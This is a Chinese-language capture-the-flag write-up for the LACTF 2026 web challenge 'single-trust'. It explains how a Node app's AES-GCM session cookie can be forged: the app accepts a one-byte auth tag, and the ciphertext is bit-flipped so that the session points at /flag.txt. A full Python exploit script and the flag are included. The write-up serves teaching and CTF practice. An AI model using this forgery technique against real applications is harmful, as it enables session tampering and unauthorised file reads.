# Writeup — single-trust (LACTF 2026, web/medium)

## 自製 session：AES-256-GCM 加密的 cookie

`index.js` 用一把隨機 key 加密 session：

```js
function makeAuth(req, res, next) {
    const iv = crypto.randomBytes(16);
    const tmpfile = "/tmp/pastestore/" + crypto.randomBytes(16).toString("hex"); // 32 hex chars
    const user = { tmpfile };
    const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
    const ct = Buffer.concat([cipher.update(JSON.stringify(user)), cipher.final()]);
    const authTag = cipher.getAuthTag();
    res.cookie("auth", [iv, authTag, ct].map(x => x.toString("base64")).join("."));
}
```

即 cookie = `base64(iv).base64(authTag).base64(ct)`，明文為 `{"tmpfile":"/tmp/pastestore/<32 hex>"}`。

`GET /` 直接把 `tmpfile` 指到的檔案讀出：

```js
res.type("text/html").send(template.replace("$CONTENT", () => fs.readFileSync(res.locals.user.tmpfile, "utf8")));
```

所以只要把解密後的 `tmpfile` 改成 `/flag.txt`，首頁就會印出 flag。

## 缺陷一：GCM auth tag 被截短，可暴力

解密端：

```js
const [iv, authTag, ct] = auth.split(".").map(x => Buffer.from(x, "base64"));
const cipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
cipher.setAuthTag(authTag);                                   // authTag 長度由攻擊者決定
res.locals.user = JSON.parse(Buffer.concat([cipher.update(ct), cipher.final()]).toString("utf8"));
```

`authTag` 來自 cookie，我可以只放 **1 個 byte**。Node 的 GCM 會接受這種短 tag，並且驗證時只比對我提供的那 1 個 byte 對不對。於是 `cipher.final()` 通過的機率是 1/256——換言之對所有 256 個可能的 tag byte 逐一嘗試，必有一個通過。原本 16-byte tag 的完整性完全瓦解。

（題目已把 aplet 在 LA CTF 2023 zero-trust 裡「連 `final()` 都不呼叫」的後門補上，但補完仍留下這個「tag 長度可控 → 短 tag 偽造」的洞。）

## 缺陷二：GCM = CTR 串流，密文可鍛

GCM 的加密部分就是 CTR keystream 與明文 XOR。因此**翻轉密文第 i 個 byte，會等量翻轉解密後明文第 i 個 byte**。已知目前明文結構，即可把它改寫成任意等長明文：

```
new_ct[i] = ct[i] XOR cur_pt[i] XOR desired_pt[i]
```

目標把 `tmpfile` 從 `/tmp/pastestore/...` 改成 `/flag.txt`（等長）：

```python
cur = f'{{"tmpfile":"/tmp/pastestore/{"a"*32}"}}'.encode()
des = f'{{"tmpfile":"/flag.txt","x":"{"a"*32}"}}'.encode()
assert len(cur) == len(des) == len(ct)
new_ct = bytes(a ^ b ^ c for (a, b, c) in zip(cur, des, ct))
```

`cur`/`des` 中那 32 個 `a` 落在同一區段、XOR 後互相抵消，該區段解出來仍是原本隨機的 32 hex（合法 JSON 字串內容、無引號），不影響解析；真正被改寫的是前段 `/tmp/pastestore/` → `/flag.txt","x":"`，使 `JSON.parse` 得到 `tmpfile == "/flag.txt"`。

## 組合攻擊

```python
import requests
from urllib.parse import unquote
from base64 import b64encode, b64decode

s = requests.Session()
s.get(URL)                                             # 拿一份新 auth cookie
iv, _tag, ct = [b64decode(x) for x in unquote(s.cookies["auth"]).split(".")]

cur = f'{{"tmpfile":"/tmp/pastestore/{"a"*32}"}}'.encode()
des = f'{{"tmpfile":"/flag.txt","x":"{"a"*32}"}}'.encode()
new_ct = bytes(a ^ b ^ c for a, b, c in zip(cur, des, ct))

for tag in range(256):                                 # 暴力 1-byte auth tag
    cookie = ".".join(b64encode(x).decode() for x in [iv, bytes([tag]), new_ct])
    s.cookies.set("auth", cookie)
    r = s.get(URL)
    if "lactf" in r.text:
        print(r.text); break
```

其中一個 tag 通過 GCM 驗證，`tmpfile` 解成 `/flag.txt`，`GET /` 讀出 `/flag.txt` 內容即 flag。

## Flag

`lactf{4pl3tc4tion_s3curi7y}`
